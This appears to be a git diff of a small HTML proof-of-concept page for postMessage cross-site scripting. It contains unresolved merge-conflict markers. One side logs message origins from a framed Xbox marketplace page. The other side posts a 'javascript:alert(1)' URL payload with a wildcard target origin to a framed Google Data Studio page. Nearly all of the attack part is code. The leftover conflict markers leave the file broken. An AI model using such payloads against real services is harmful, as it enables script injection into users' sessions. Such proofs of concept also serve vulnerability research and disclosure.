@@ -7,6 +7,7 @@
   <div id="message"></div>
   <iframe id=x src="https://marketplace.xbox.com/en-US/" width="1000" height="1000"></iframe>
   <script>
+<<<<<<< HEAD
       function listener(event) {
         document.getElementById("message").innerHTML = event.origin;
         alert(event.origin);
@@ -18,5 +19,14 @@
         attachEvent("onmessage", listener);
       }
   </script>
+=======
+  // var popup = window.open('https://datastudio.google.com/u/0/external?origin=https://datastudio.google.com/');
+  // function post(){popup.postMessage({"type": "externalUrl", "url": "javascript:alert(1)"},"*")}
+  // setInterval(post,5000);
+  document.getElementById("frame").postMessage({"type": "externalUrl", "url": "javascript:alert(1)"},"*");
+  </script>
+<body>
+  <iframe id="frame" src="https://datastudio.google.com/u/0/external?origin=https://datastudio.google.com/"></iframe>
+>>>>>>> 16763d6997254228e91ecfabd7f398ebb2620cdc
 </body>
 </html>
